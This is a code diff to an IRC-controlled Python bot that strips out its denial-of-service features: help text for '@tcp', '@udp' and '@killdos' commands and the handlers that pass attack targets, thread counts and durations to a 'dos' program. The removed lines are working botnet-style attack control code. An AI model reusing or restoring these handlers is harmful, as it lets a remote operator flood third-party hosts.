@@ -234,10 +234,6 @@ def bot_usage(action, sender):
     s.send("%s %s : @register <password> <email> : Register bot with nickserv\r\n" %(action, sender))
     s.send("%s %s : @join : <channel> : Join this channel\r\n" % (action, sender))
     s.send("%s %s : @part : <channel> : Leave this channel\r\n" % (action, sender))
-    s.send("%s %s : ======== DDOS Commands ========: \r\n" % (action, sender))
-    s.send("%s %s : @tcp <ip> <port> <threads> <secs> : tcp ddos attack\r\n" % (action, sender))
-    s.send("%s %s : @udp <ip> <port> <threads> <secs> : tcp udp attack\r\n" % (action, sender))
-    s.send("%s %s : @killdos : Kill all running attacks\r\n" % (action, sender))
 
 
 def register(final, sender_):
@@ -372,41 +368,7 @@ def listen_irc(irc_auth,chan_key):
                     if verbose:
                         print("Shutting down...")
                     quit_irc(sender)
-                # ddos commands
-                elif re.match(r'^:@tcp.*$', line[3]):
-                    if debug or verbose:
-                        print("Received tcp dos command: %s from %s" % (final,sender))
-                    try:
-                        mqsend("dos -t %s >/dev/null 2>&1" % final)
-                    except Exception as e:
-                        s.send("%s %s :Error publishing message\n" % (action,sender))
-                        if verbose:
-                            print("Failed to publish message!")
-                        if debug:
-                            print("Error:\n %s" % e)
-                elif re.match(r'^:@udp.*$', line[3]):
-                    if debug or verbose:
-                        print("Received udp dos command: %s from %s" % (final,sender))
-                    try:
-                        mqsend("dos -u %s >/dev/null 2>&1" % final)
-                    except Exception as e:
-                        s.send("%s %s :Error publishing message\n" % (action,sender))
-                        if verbose:
-                            print("Failed to publish message!")
-                        if debug:
-                            print("Error:\n %s" % e)
-                elif re.match(r'^:@killdos.*$', line[3]):
-                    if verbose or debug:
-                        print("Received a kill from %s, killing all attacks" % sender)
-                    s.send("%s %s :Killing all attacks \n" % (action,sender))
-                    try:
-                        mqsend("dos -k >/dev/null 2>&1")
-                    except Exception as e:
-                        s.send("%s %s :Error publishing message\n" % (action,sender))
-                        if verbose:
-                            print("Failed to publish message!")
-                        if debug:
-                            print("Error:\n %s" % e)
+                
                 else:
                     pass
       
